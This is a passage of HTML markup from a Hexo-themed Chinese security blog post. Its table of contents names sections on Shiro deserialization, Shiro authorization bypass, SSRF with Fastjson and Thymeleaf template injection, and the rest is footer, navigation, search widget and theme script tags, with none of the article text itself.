class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1"><span class="nav-text">代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Ssrf%E7%BB%93%E5%90%88Fastjson"><span class="nav-text">0x06 Ssrf结合Fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2"><span class="nav-text">代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">0x07 Thymeleaf模板注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3"><span class="nav-text">代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%90%8E%E8%AF%9D"><span class="nav-text">0x08 后话</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box shields">
+        
+            <div class="info-item">
+                
+                <a class="shields-item">
+                    <img src="https://img.shields.io/badge/Since-2023_--_2024-dodgerblue?style=flat-square">
+                </a>
+                
+                    <a class="shields-item" href="/blog/">
+                        <img src="https://img.shields.io/badge/WebMaster-Yu9-dodgerblue?style=flat-square">
+                    </a>
+                
+                
+                <a class="shields-item" href="https://hexo.io" target="_blank">
+                    <img src="https://img.shields.io/badge/Powered_by-Hexo-dodgerblue?style=flat-square">
+                </a>
+                <a class="shields-item" href="https://github.com/XPoet/hexo-theme-keep" target="_blank">
+                    <img class="shields-keep-version" src="https://img.shields.io/badge/Theme-Keep-dodgerblue?style=flat-square">
+                </a>
+                
+            </div>
+            
+                <div class="info-item">
+                    
+                        
+                    
+                </div>
+            
+        
+
+        <div class="count-item info-item shields">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">40.7k</span>
+                </span>
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">0x02 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%A3%B0%E6%98%8E"><span class="nav-text">0x03 声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">0x04 shiro反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="nav-text">0x05 shiro权限绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1"><span class="nav-text">代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Ssrf%E7%BB%93%E5%90%88Fastjson"><span class="nav-text">0x06 Ssrf结合Fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2"><span class="nav-text">代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">0x07 Thymeleaf模板注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3"><span class="nav-text">代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%90%8E%E8%AF%9D"><span class="nav-text">0x08 后话</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+
+</body>
+</html>
